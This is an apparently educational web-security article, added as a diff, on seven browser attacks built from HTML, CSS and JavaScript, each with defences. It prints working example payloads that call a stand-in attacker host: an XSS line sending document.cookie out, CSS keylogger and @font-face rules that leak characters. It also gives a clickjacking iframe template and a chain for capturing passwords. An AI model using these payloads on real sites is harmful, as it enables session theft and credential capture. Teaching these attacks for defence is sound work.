@@ -1,0 +1,373 @@
+<div class="box warning">
+
+<strong>
+Educational Disclaimer
+</strong>
+
+<p>
+This article is intended for authorized security assessments and defensive education only. All techniques described below are demonstrated against test environments you own or have explicit permission to assess. HackerAI does not support or encourage unauthorized access.
+</p>
+
+</div>
+
+<h2>The Cursed Trinity: Attacks With Only HTML, CSS, and JavaScript</h2>
+
+<p>
+When most people think of "hacking," they imagine compiled binaries, buffer overflows, and meterpreter shells. But some of the most insidious attacks in the browser require nothing more than web standards — no plugins, no ActiveX, no Java applets. Just HTML, CSS, and vanilla JavaScript.
+</p>
+
+<hr>
+
+<h2>1. Stored & Reflected Cross-Site Scripting (XSS)</h2>
+
+<p>
+<strong>What it is:</strong> An attacker injects executable scripts into a web page that other users view.
+</p>
+
+<ul>
+<li>
+<strong>Reflected XSS:</strong> The payload lives in a request parameter (a search query, an error message, a redirect URL) that the server echoes back into the page without sanitization.
+</li>
+<li>
+<strong>Stored XSS:</strong> The payload is persisted on the server — in a comment, a forum post, a profile field — and served to every visitor.
+</li>
+</ul>
+
+<p>
+<strong>Proof of Concept:</strong>
+</p>
+
+<div class="box job">
+<strong>Code Example:</strong>
+<br><br>
+&lt;!-- If the server reflects ?name= unsanitized --&gt;<br>
+&lt;input type="text" id="name" value="&lt;script&gt;fetch('https://attacker.example.com/steal?c='+document.cookie)&lt;/script&gt;"&gt;
+</div>
+
+<p>
+<strong>What a pentester proves:</strong> Cookie theft, session hijacking, keylogging, phishing overlays, internal network scanning via <code>fetch()</code>, and full DOM manipulation — all without a single server-side bug beyond the missing encoding filter.
+</p>
+
+<p>
+<strong>How to prevent it:</strong>
+</p>
+
+<ul>
+<li>
+<strong>Output encoding:</strong> Encode user-supplied data before rendering. Use context-appropriate encoding — HTML entity encode for HTML body, JavaScript encode for script contexts, URL encode for URL parameters. Libraries like OWASP Java Encoder or DOMPurify handle this reliably.
+</li>
+<li>
+<strong>Content Security Policy (CSP):</strong> Set a strict CSP header such as <code>default-src 'self'; script-src 'self'</code>. This stops inline scripts and external script loads even if an injection occurs.
+</li>
+<li>
+<strong>HttpOnly cookies:</strong> Set the <code>HttpOnly</code> flag on session cookies so they cannot be read by <code>document.cookie</code>.
+</li>
+<li>
+<strong>Input validation:</strong> Validate and reject unexpected input server-side before it reaches any reflection or storage point.
+</li>
+</ul>
+
+<hr>
+
+<h2>2. DOM Clobbering</h2>
+
+<p>
+<strong>What it is:</strong> An attacker uses HTML element <code>id</code> and <code>name</code> attributes to override global JavaScript variables and corrupt the page's logic.
+</p>
+
+<p>
+<strong>How it works:</strong> HTML elements with <code>id</code> attributes become properties on the <code>window</code> object. If the page's JavaScript does <code>if (window.someConfig) { ... }</code>, an attacker can inject:
+</p>
+
+<div class="box job">
+<strong>Code Example:</strong>
+<br><br>
+&lt;a id="someConfig" href="javascript:alert('owned')"&gt;hidden&lt;/a&gt;
+</div>
+
+<p>
+The <code>&lt;a&gt;</code> element's <code>href</code> becomes <code>someConfig.toString()</code> — which returns the full URL, including <code>javascript:</code> protocol, if the code uses the value in a dangerous sink like <code>innerHTML</code> or a script loader.
+</p>
+
+<p>
+<strong>What a pentester proves:</strong> Bypassing sanitizers that strip <code>&lt;script&gt;</code> tags but leave <code>&lt;a&gt;</code>, <code>&lt;form&gt;</code>, <code>&lt;img&gt;</code>, or <code>&lt;iframe&gt;</code> intact. DOM clobbering is often used in advanced XSS chains against frameworks (jQuery, Google's Closure Library, even some React patterns).
+</p>
+
+<p>
+<strong>How to prevent it:</strong>
+</p>
+
+<ul>
+<li>
+<strong>Validate before use:</strong> Instead of checking <code>if (window.someConfig)</code>, use <code>if (typeof someConfig === 'object' &amp;&amp; someConfig !== null)</code> or check with <code>Object.prototype.hasOwnProperty</code> and a type guard.
+</li>
+<li>
+<strong>Avoid direct window property lookups:</strong> Store configuration in a closed scope or a frozen object rather than relying on global <code>window</code> properties.
+</li>
+<li>
+<strong>Sanitize HTML inputs:</strong> Strip <code>id</code> and <code>name</code> attributes from user-supplied HTML when possible, or use a strict allowlist.
+</li>
+</ul>
+
+<hr>
+
+<h2>3. CSS Keylogger</h2>
+
+<p>
+<strong>What it is:</strong> A CSS-only attack that exfiltrates data through attribute selectors and <code>background-image</code> URLs.
+</p>
+
+<p>
+<strong>How it works:</strong> CSS attribute selectors can match partial text content of <code>&lt;input&gt;</code> values:
+</p>
+
+<div class="box job">
+<strong>Code Example:</strong>
+<br><br>
+input[value^="a"] { background: url(https://attacker.example.com/log?a); }<br>
+input[value^="b"] { background: url(https://attacker.example.com/log?b); }<br>
+/* ... repeat for every character, every position */
+</div>
+
+<p>
+When a user types into the input, the value attribute changes, the CSS rule matches, and the browser makes a request to the attacker's server — leaking one character at a time.
+</p>
+
+<p>
+<strong>Limitations:</strong> The <code>value</code> attribute only updates on form submission or programmatic <code>setAttribute()</code> — not on every keystroke. However, in login forms that pre-fill from a password manager, or when combined with JavaScript that sets the <code>value</code> attribute on each <code>input</code> event, this becomes functional.
+</p>
+
+<p>
+<strong>What a pentester proves:</strong> Exfiltration of CSRF tokens, detection of visited links (via <code>:visited</code> selector leaks, though modern browsers limit this), and "scroll jacking" through scroll-based CSS animations that make requests.
+</p>
+
+<p>
+<strong>How to prevent it:</strong>
+</p>
+
+<ul>
+<li>
+<strong>Strict CSP:</strong> Use <code>style-src 'nonce-...'</code> or <code>style-src 'sha256-...'</code> to block inline <code>&lt;style&gt;</code> tags entirely.
+</li>
+<li>
+<strong>Never allow user content in &lt;style&gt; elements:</strong> User-supplied data should never be rendered inside a <code>&lt;style&gt;</code> tag or a <code>style</code> attribute without rigorous sanitization.
+</li>
+<li>
+<strong>Input validation:</strong> Reject or escape CSS-relevant characters (<code>{</code>, <code>}</code>, <code>:</code>, <code>;</code>, <code>url(</code>) in user input that will be rendered near style contexts.
+</li>
+</ul>
+
+<hr>
+
+<h2>4. Clickjacking (UI Redressing)</h2>
+
+<p>
+<strong>What it is:</strong> An attacker tricks a user into clicking something they can't see — a "like" button, a transfer confirmation, or a permission grant — by overlaying the target page as a transparent <code>&lt;iframe&gt;</code> over a decoy UI.
+</p>
+
+<p>
+<strong>How it works (HTML + CSS only):</strong>
+</p>
+
+<div class="box job">
+<strong>Code Example:</strong>
+<br><br>
+&lt;style&gt;<br>
+&nbsp;&nbsp;iframe {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;position: absolute;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;top: 0; left: 0;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;width: 500px; height: 500px;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;opacity: 0.001;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;z-index: 10;<br>
+&nbsp;&nbsp;}<br>
+&nbsp;&nbsp;.deco-button {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;position: absolute;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;top: 200px; left: 100px;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;z-index: 1;<br>
+&nbsp;&nbsp;}<br>
+&lt;/style&gt;<br>
+&lt;div class="deco-button"&gt;Click here for a free cat!&lt;/div&gt;<br>
+&lt;iframe src="https://target.example.com/transfer?amount=1000"&gt;&lt;/iframe&gt;
+</div>
+
+<p>
+The user thinks they're clicking the decoy. The click goes through the transparent iframe into the target page. With careful pixel positioning, a single click on "Pay Now" or "Authorize" can be precisely aligned with the target's button.
+</p>
+
+<p>
+<strong>What a pentester proves:</strong> Any sensitive action (OAuth authorization, bank transfer, admin panel actions) can be triggered without the user's knowledge. The attacker doesn't even need JavaScript — this works with pure HTML + CSS.
+</p>
+
+<p>
+<strong>How to prevent it:</strong>
+</p>
+
+<ul>
+<li>
+<strong>X-Frame-Options header:</strong> Set <code>X-Frame-Options: DENY</code> or <code>X-Frame-Options: SAMEORIGIN</code> to prevent your site from being loaded in iframes on other domains.
+</li>
+<li>
+<strong>CSP frame-ancestors:</strong> Use <code>Content-Security-Policy: frame-ancestors 'none'</code> or <code>'self'</code> for more granular control.
+</li>
+</ul>
+
+<hr>
+
+<h2>5. Tabnabbing (Reverse Tabnabbing)</h2>
+
+<p>
+<strong>What it is:</strong> An attacker exploits the <code>target="_blank"</code> link behavior to change the parent page after the user navigates away.
+</p>
+
+<p>
+<strong>How it works:</strong>
+</p>
+
+<div class="box job">
+<strong>Code Example:</strong>
+<br><br>
+&lt;a href="https://attacker.example.com/evil" target="_blank"&gt;Check this out!&lt;/a&gt;
+</div>
+
+<p>
+When the link lacks <code>rel="noopener noreferrer"</code>, the opened page can use <code>window.opener.location = 'https://phish.example.com/login'</code> to replace the original tab with a phishing page. When the user returns to the original tab (now a fake login screen), they re-enter credentials.
+</p>
+
+<p>
+<strong>What a pentester proves:</strong> Any external link on a site that uses <code>target="_blank"</code> without <code>rel="noopener noreferrer"</code> can be weaponized if the attacker controls the linked page.
+</p>
+
+<p>
+<strong>How to prevent it:</strong>
+</p>
+
+<ul>
+<li>
+Always add <code>rel="noopener noreferrer"</code> to every <code>target="_blank"</code> link.
+</li>
+<li>
+Modern browsers default <code>target="_blank"</code> to <code>noopener</code> behavior, but never rely on this — always be explicit.
+</li>
+</ul>
+
+<hr>
+
+<h2>6. CSS Exfiltration via @font-face / Unicode Range</h2>
+
+<p>
+<strong>What it is:</strong> Using CSS font-loading side channels to exfiltrate page content character by character.
+</p>
+
+<p>
+<strong>How it works:</strong> If an attacker can inject CSS into a page (e.g., a <code>&lt;style&gt;</code> tag via a comment form), they can define custom <code>@font-face</code> rules that match specific text content via <code>unicode-range</code>:
+</p>
+
+<div class="box job">
+<strong>Code Example:</strong>
+<br><br>
+@font-face {<br>
+&nbsp;&nbsp;font-family: "leak";<br>
+&nbsp;&nbsp;src: url(https://attacker.example.com/leak?c=A);<br>
+&nbsp;&nbsp;unicode-range: U+0041;<br>
+}<br>
+body { font-family: "leak", ...; }
+</div>
+
+<p>
+If the page body contains the letter 'A', the browser loads the font from the attacker's server. An entire page's character set can be leaked, one request at a time.
+</p>
+
+<p>
+<strong>What a pentester proves:</strong> Exfiltration of visible text content — including CSRF tokens, usernames, and other sensitive data rendered in the DOM — using only CSS, with no JavaScript required.
+</p>
+
+<p>
+<strong>How to prevent it:</strong>
+</p>
+
+<ul>
+<li>
+Block user-supplied <code>&lt;style&gt;</code> tags with a strict CSP (<code>style-src 'nonce-...'</code>).
+</li>
+<li>
+If user-controlled styles are necessary, sanitize <code>@font-face</code> rules and <code>unicode-range</code> declarations specifically.
+</li>
+</ul>
+
+<hr>
+
+<h2>7. Browser History Leak via :visited</h2>
+
+<p>
+<strong>What it is:</strong> An attacker detects which links a user has visited using CSS selectors.
+</p>
+
+<p>
+<strong>How it works (mostly neutered in modern browsers):</strong>
+</p>
+
+<div class="box job">
+<strong>Code Example (legacy):</strong>
+<br><br>
+a:visited { background: url(https://attacker.example.com/leak?url=https://admin.internal.com); }
+</div>
+
+<p>
+<strong>Current state:</strong> Modern browsers (Chrome 82+, Firefox 68+, Safari 13.1+) severely restrict what CSS properties <code>:visited</code> can change — only <code>color</code>, <code>background-color</code>, <code>border-color</code>, <code>outline-color</code>, and <code>column-rule-color</code> — and these are not recomputed for <code>getComputedStyle()</code>. Timing-based attacks measuring paint time differences remain theoretically possible in edge cases.
+</p>
+
+<p>
+<strong>How to prevent it:</strong>
+</p>
+
+<ul>
+<li>
+Keep browsers up to date — modern versions already mitigate this.
+</li>
+<li>
+Use <code>private</code> browsing mode for sensitive browsing to prevent history-based profiling.
+</li>
+</ul>
+
+<hr>
+
+<h2>Putting It All Together: A Realistic Test Scenario</h2>
+
+<p>
+During an authorized assessment, a pentester might chain several of these:
+</p>
+
+<ul>
+<li>
+<strong>Find a stored XSS</strong> that bypasses <code>&lt;script&gt;</code> filters but allows <code>&lt;style&gt;</code> tags (DOM clobbering or CSS injection).
+</li>
+<li>
+<strong>Inject a CSS keylogger</strong> on a login form to capture the first few characters of a password.
+</li>
+<li>
+<strong>Use DOM clobbering</strong> to redirect a JSONP callback or config object, triggering a more traditional XSS.
+</li>
+<li>
+<strong>Deliver a clickjacking overlay</strong> to trick an admin into approving a malicious OAuth app.
+</li>
+</ul>
+
+<hr>
+
+<h2>Final Thoughts</h2>
+
+<p>
+HTML, CSS, and JavaScript aren't just for building websites — they're a full-fledged attack surface. The next time you see a "simple" comment form or a "just styling" CSS injection, remember: the trinity of web markup is more powerful than most developers give it credit for.
+</p>
+
+<p>
+<strong>The defense mindset is everything.</strong> Every CSS injection that goes unfixed, every missing <code>rel="noopener"</code>, every missing CSP header — these are opportunities for attackers and findings for pentesters.
+</p>
+
+<p>
+As an authorized tester, understanding these techniques means you can find and fix them before a real attacker does. Awareness, proper headers, output encoding, and Content Security Policy are your strongest weapons.
+</p>
+
+<p>
+Stay sharp. Test responsibly. Patch thoroughly.
+</p>
